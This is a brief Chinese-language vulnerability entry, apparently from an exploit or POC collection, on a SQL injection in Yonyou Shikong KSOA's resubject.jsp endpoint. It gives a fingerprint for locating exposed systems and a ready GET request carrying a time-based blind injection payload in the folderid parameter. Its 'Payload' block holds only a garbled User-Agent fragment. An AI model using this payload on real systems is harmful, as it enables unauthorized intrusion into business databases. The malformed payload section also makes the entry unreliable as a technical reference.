# 用友时空KSOAresubject存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`
- **请求**：`GET /km/resubject.jsp?folderid=';WAITFOR DELAY '0:0:5'-- HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200